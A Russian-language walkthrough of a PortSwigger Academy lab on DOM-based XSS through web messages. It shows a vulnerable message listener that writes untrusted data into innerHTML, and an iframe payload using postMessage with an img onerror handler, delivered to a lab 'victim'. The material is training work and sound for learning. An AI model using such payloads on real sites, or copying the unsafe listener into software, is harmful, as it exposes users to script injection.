Откроем уязвимую страницу и нажмем `ПКМ` -> `inspect` 
и увидим там следующий код
```
<script>
                        window.addEventListener('message', function(e) {
                            document.getElementById('ads').innerHTML = e.data;})
</script>
```
Увидим, что в данном скрипте присутсвует метод `addEventListener`, который ждет вебовского вызова
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/17.%20DOM-based%20vulnerabilities/1.%20DOM%20XSS%20using%20web%20messages/pics%20for%20walkthrough/1.png)
Когда iframe загружается, метод `postMessage()` отправляет веб-сообщение на домашнюю страницу. Прослушиватель событий, предназначенный для показа рекламы, извлекает содержимое веб-сообщения и вставляет его в `div` с идентификатором `ads`. Однако в этом случае он вставляет наш тег `img`, который содержит недопустимый атрибут `src`. Это приводит к ошибке, которая заставляет обработчик события `onerror` выполнять нашу полезную нагрузку

Соответсвенно, сконфигурируем наш пэйлоад
```
<iframe src="https://0a0a008f048853b386c712aa00b1001d.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=alert(1)>','*')">
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/17.%20DOM-based%20vulnerabilities/1.%20DOM%20XSS%20using%20web%20messages/pics%20for%20walkthrough/2.png)
проверим через `View exploit `
и увидим, что XSS Отрабатывает
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/17.%20DOM-based%20vulnerabilities/1.%20DOM%20XSS%20using%20web%20messages/pics%20for%20walkthrough/3.png)

Далее изменим пэйлоад заменив `onerror=alert(1)` на `onerror=print()`, так как этого требует задание
```
<iframe src="https://0a0a008f048853b386c712aa00b1001d.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
```
Нажмем `Store` -> `Deliver exploit to victim`
и получим уведомление об успешно выполненной лабораторной работе
